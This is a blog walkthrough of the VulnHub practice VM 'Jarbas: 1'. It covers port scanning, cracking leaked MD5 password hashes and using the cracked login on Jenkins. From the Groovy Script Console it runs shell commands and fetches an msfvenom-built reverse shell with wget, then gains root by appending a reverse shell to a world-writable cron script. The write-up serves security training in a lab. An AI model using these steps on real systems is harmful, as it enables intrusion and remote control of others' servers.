---
layout: post
date: 2018-08-03 12:16:52 +0000
last_modified_at: 2018-12-09 08:17:42 +0000
title: "Jarbas: 1 Walkthrough"
subtitle: "Those Were the Days"
category: Walkthrough
tags: [VulnHub, "Jarbas"]
comments: true
image:
  feature: jarbas-1-walkthrough.jpg
  credit: Free-Photos / Pixabay
  creditlink: https://pixabay.com/en/books-library-education-literature-768426/
---

This post documents the complete walkthrough of Jarbas: 1, a boot2root [VM][1] created by [Tiago Tavares][2], and hosted at [VulnHub][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post 
{:.no_toc} 

* TOC 
{:toc}

## Background

A tribute to a nostalgic Brazilian search engine in the end of 90’s. The aim is to get a `root` shell.

## Information

Let’s start with a `nmap` scan to establish the available services in the host.

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.10.130
...
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 28:bc:49:3c:6c:43:29:57:3c:b8:85:9a:6d:3c:16:3f (RSA)
|   256 a0:1b:90:2c:da:79:eb:8f:3b:14:de:bb:3f:d2:e7:3f (ECDSA)
|_  256 57:72:08:54:b7:56:ff:c3:e6:16:6f:97:cf:ae:7f:76 (ED25519)
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-methods:
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Jarbas - O Seu Mordomo Virtual!
3306/tcp open  mysql   syn-ack ttl 64 MariaDB (unauthorized)
8080/tcp open  http    syn-ack ttl 64 Jetty 9.4.z-SNAPSHOT
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
```

`nmap` finds `22/tcp`, `80/tcp`, `3306/tcp`, and `8080/tcp` open. Nothing unusual here.

## Directory/File Enumeration

Let's use `wfuzz` to determine any directories or files of interest. I use the following options.

```
# export WORDLIST=/usr/share/wfuzz/wordlists/general
# wfuzz -w $WORDLIST/megabeast.txt -w $WORDLIST/extensions_common.txt --hc 404 -t 64 http://192.168.10.130/FUZZFUZ2Z
```

Here's the result of running the command.

```
********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://192.168.10.130/FUZZFUZ2Z
Total requests: 1272964

==================================================================
ID	Response   Lines      Word         Chars          Payload    
==================================================================

009671:  C=200     13 L	      28 W	    359 Ch	  "access - .html"
582568:  C=200   1006 L	    4983 W	  74409 Ch	  "icons - /"
600443:  C=200    403 L	    1784 W	  32808 Ch	  "index - .html"
```

Here's what `access.html` looks like.

![access.html](/assets/images/posts/jarbas-1-walkthrough/01cca602.png)

The usernames and password hashes is a clear invitation to perform offline password cracking.

## Jenkins

**John the Ripper** can crack the password hashes as follows.

```
# john --format=raw-md5 --show hashes.txt
tiago:italia99
trindade:marianna
eder:vipsu

3 password hashes cracked, 0 left
```

It turns out that **Jenkins** is running behind `8080/tcp` seen earlier in the `nmap` scan. Here's what it looks like.

![Jenkins](/assets/images/posts/jarbas-1-walkthrough/fd1eb8f9.png)

The credential (`eder:vipsu`) allows us to login in to **Jenkins**.

![Logged In](/assets/images/posts/jarbas-1-walkthrough/9e1fb477.png)

I soon discover that **Jenkins** allows the execution of Groovy scripts in **Script Console**.

![Script Console](/assets/images/posts/jarbas-1-walkthrough/7507d3e1.png)

## Groovy Script

According to [Wikipedia](https://en.wikipedia.org/wiki/Apache_Groovy),

> Apache Groovy is a Java-syntax-compatible object-oriented programming language for the Java platform. It is both a static and dynamic language with features similar to those of Python, Ruby, Perl, and Smalltalk. It can be used as both a programming language and a scripting language for the Java Platform, is compiled to Java virtual machine (JVM) bytecode, and interoperates seamlessly with other Java code and libraries.

The console is able to execute shell commands like so.

![id](/assets/images/posts/jarbas-1-walkthrough/407406c2.png)

The result above shows the output of running `id`. We are executing shell commands in the context of the `jenkins` account.

Let's see if we can execute `wget` to get ourselves a shell.

![wget](/assets/images/posts/jarbas-1-walkthrough/df946598.png)

Awesome. Now, we can transfer a reverse shell executable over. But, before we do that, we need to determine if we are dealing with a 32-bit or 64-bit OS.

![uname -a](/assets/images/posts/jarbas-1-walkthrough/c08a81a2.png)

Let's generate the reverse shell on our attacking machine:

```
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.10.128 LPORT=4444 -f elf -o rev
```

We can now set up `SimpleHTTPServer` on our attacking and transfer it over with `wget` at the **Script Console**.

_On our attacking machine_

![wget](/assets/images/posts/jarbas-1-walkthrough/c842c9da.png)

_At the **Script Console**_

![wget](/assets/images/posts/jarbas-1-walkthrough/89ef4e95.png)

Remember to make the `/tmp/rev` executable with `chmod +x /tmp/rev`.

![ls](/assets/images/posts/jarbas-1-walkthrough/18f4e608.png)

We should be good to go. Let's run our `netcat` listener and execute `/tmp/rev` at the console.

![shell](/assets/images/posts/jarbas-1-walkthrough/40bd5800.png)

We have shell.

## Privilege Escalation

I had my hopes pinned on [CVE-2017-1000253](https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt) from the get-go.

![CentOS](/assets/images/posts/jarbas-1-walkthrough/0e4bacad.png)

The VM is running on CentOS 7 with a 3.10 kernel. The conditions are almost identical to CVE-2017-1000253.

Too bad the VM is one version shy of being vulnerable. I've no choice but to look for other ways to gain root access.

During the process of checking for world-writable files in the VM, I stumbled upon this.

```
$ find / -type f -perm /o+w -ls 2>/dev/null
...
844412    4 -rwxrwxrwx   1 root     root           50 Apr  1 14:00 /etc/script/CleaningScript.sh
```

![CleaningScript.sh](/assets/images/posts/jarbas-1-walkthrough/d9f3a650.png)

If I had to guess from its content, I would say this is probably running under `root`'s `crontab`.

Let's append our reverse shell to the script.

![rev](/assets/images/posts/jarbas-1-walkthrough/4b94503e.png)

Boom. A `root` shell.

![root](/assets/images/posts/jarbas-1-walkthrough/d710bca7.png)

My guess was right.

![crontab](/assets/images/posts/jarbas-1-walkthrough/2198ba7e.png)

## Eyes on the Prize

Getting the flag is trivial.

![flag](/assets/images/posts/jarbas-1-walkthrough/bad0fdf5.png)

:dancer:

[1]: https://www.vulnhub.com/entry/jarbas-1,232/
[2]: https://twitter.com/@tiagotvrs
[3]: https://www.vulnhub.com/
